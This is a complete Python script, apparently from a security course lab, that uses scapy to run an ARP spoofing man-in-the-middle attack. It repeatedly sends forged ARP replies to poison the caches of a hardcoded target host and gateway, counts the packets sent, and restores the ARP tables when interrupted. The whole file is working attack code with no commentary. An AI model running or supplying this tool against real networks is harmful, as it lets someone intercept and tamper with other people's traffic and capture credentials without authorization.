#!/usr/bin/env python
import sys
import time
import scapy.all as sp


def get_addr(ip):
    arp_request = sp.ARP(pdst=ip)
    broadcast = sp.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = sp.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if len(answered_list) == 0:
        print("[-] Failed to get MAC address for IP: {}".format(ip))
        return None
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_addr(target_ip)
    if target_mac is None:
        return

    packet = sp.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    sp.send(packet, verbose=False)


def restore(dest_ip, src_ip):
    destmac = get_addr(dest_ip)
    source_mac = get_addr(src_ip)
    if destmac is None or source_mac is None:
        print("[-] Failed to get MAC addresses for restoring ARP table")
        return

    packet = sp.ARP(op=2, pdst=dest_ip, hwdst=destmac, psrc=src_ip, hwsrc=source_mac)
    sp.send(packet, count=4, verbose=False)


target_ip = "10.0.2.23"
gateway_ip = "10.0.2.1"

try:
    sent_packets_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packets_count += 2
        print("\r[+] Packets Sent: {}".format(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl + C. Resetting ARP tables...\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("[+] ARP tables restored.")
